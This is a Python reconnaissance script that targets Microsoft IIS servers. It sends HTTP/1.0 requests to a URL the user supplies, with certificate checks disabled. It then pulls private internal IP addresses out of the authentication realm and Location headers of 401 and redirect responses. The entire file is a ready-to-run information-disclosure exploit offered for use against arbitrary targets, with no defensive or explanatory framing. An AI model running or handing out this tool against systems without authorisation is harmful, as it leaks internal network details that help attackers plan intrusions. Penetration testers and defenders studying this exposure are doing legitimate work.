#! /usr/bin/env python
import requests
import sys
import ipaddress
import re
import urllib3
import argparse
from urllib.parse import urlparse

urllib3.disable_warnings()
from http import client

client.HTTPConnection._http_vsn=10
client.HTTPConnection._http_vsn_str='HTTP/1.0'
ips = []

def GetInternalIP(text):
    try:
        match_realm = re.search(r"realm=\"(.*)\"", text)
        if match_realm and match_realm.groups()[0] not in ips:
            ips.append(match_realm.groups()[0])
        match_location = re.search(r"Location':\s?[\"']https?://(\d+\.\d+\.\d+\.\d+)", text)
        if match_location and match_location.groups()[0] not in ips:
           ips.append(match_location.groups()[0])
    except Exception as e:
        pass

def ReqTarget(url, debug):
    parsed_url = urlparse(url)
    if not all([parsed_url.scheme, parsed_url.netloc]):
        print("Invalid URL")
        return
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
        }
        target_url = "{}://{}{}".format(parsed_url.scheme, parsed_url.netloc, parsed_url.path)
        if target_url.endswith('/'):
            target_url = target_url[:-1]
        print(f"[*] Try to access {target_url}")
        resp_headers = ""
        response = requests.get(target_url, headers=headers, verify = False, allow_redirects=False)
        if debug:
            print(f"[*] Resp status code is {response.status_code}")
        if response.status_code == 401 or response.status_code // 100 == 3:
            resp_headers += str(response.headers)
        print(f"[*] Try to access {target_url}/")
        resp2 = requests.get(target_url + "/", headers=headers, verify = False, allow_redirects=False)
        if debug:
            print(f"[*] Resp status code is {resp2.status_code}")
        if resp2.status_code == 401 or resp2.status_code // 100 == 3:
            resp_headers += str(resp2.headers)
        if len(resp_headers) == 0:
            print(f"[-] Need 401 or 30X url, current status code is {resp2.status_code}")
        GetInternalIP(resp_headers)
    except Exception as e:
        if debug:
            print(e)
        GetInternalIP(str(e))

    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Use to get the internal ip of IIS.')
    parser.add_argument('-u', '--url', help='target url', required=True)
    parser.add_argument('-d', '--debug', action='store_true',help='Print Debug info', default=False, required=False)
    args = parser.parse_args()

    ReqTarget(args.url, args.debug)
    if len(ips) == 0:
        print("[-] No internal ip found, exit ...")
        sys.exit(0)

    for ip in ips:
        try:
            if ipaddress.ip_address(ip).is_private:
                print(f"[+] Internal ip:\n\t👉  {ip}")
        except:
            continue